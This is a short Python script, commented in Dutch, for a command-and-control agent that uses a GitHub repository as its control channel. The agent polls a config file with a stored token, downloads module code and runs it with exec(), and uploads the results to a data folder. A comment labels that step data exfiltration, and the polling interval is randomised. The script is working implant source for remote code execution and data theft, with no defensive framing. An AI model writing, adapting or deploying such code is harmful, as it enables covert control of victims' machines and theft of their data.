import os, json, time, random, uuid, base64, requests
from datetime import datetime

# Basis instellingen laden
with open("agent_config.json", "r") as f:
    ac = json.load(f)

ID = ac.get("client_id") or str(uuid.uuid4())[:8]
URL = f"https://api.github.com/repos/{ac['repo_owner']}/{ac['repo_name']}/contents"
HDR = {"Authorization": f"token {ac['github_token']}", "Accept": "application/vnd.github.v3+json"}

def gh_get(path):
    r = requests.get(f"{URL}/{path}", headers=HDR)
    if r.status_code == 200:
        return base64.b64decode(r.json()["content"]).decode()
    return None

def gh_put(path, data):
    # Eerst SHA ophalen voor overschrijven/aanmaken
    sha = None
    r = requests.get(f"{URL}/{path}", headers=HDR)
    if r.status_code == 200: sha = r.json()["sha"]
    
    payload = {"message": "update", "content": base64.b64encode(json.dumps(data).encode()).decode(), "branch": "main"}
    if sha: payload["sha"] = sha
    requests.put(f"{URL}/{path}", headers=HDR, json=payload)

print(f"Agent {ID} actief...")

while True:
    try:
        # 1. Config ophalen [cite: 41]
        conf = json.loads(gh_get("config/config.json") or "{}")
        
        # 2. Check of deze client moet draaien [cite: 43]
        if not conf.get("active_clients") or ID in conf["active_clients"]:
            for m in conf.get("modules", []):
                name = m['name']
                # 3. Module code downloaden en direct uitvoeren [cite: 48, 49]
                code = gh_get(f"modules/{name}.py")
                if code:
                    print(f"Running {name}...")
                    local_vars = {}
                    exec(code, globals(), local_vars)
                    result = local_vars['execute'](m, ID)
                    
                    # 4. Data exfiltratie naar /data folder [cite: 45]
                    ts = datetime.now().strftime("%H%M%S")
                    gh_put(f"data/{ID}_{name}_{ts}.json", result)

    except Exception as e: print(f"Fout: {e}")
    
    # 5. Randomized polling interval [cite: 52]
    time.sleep(random.randint(30, 60))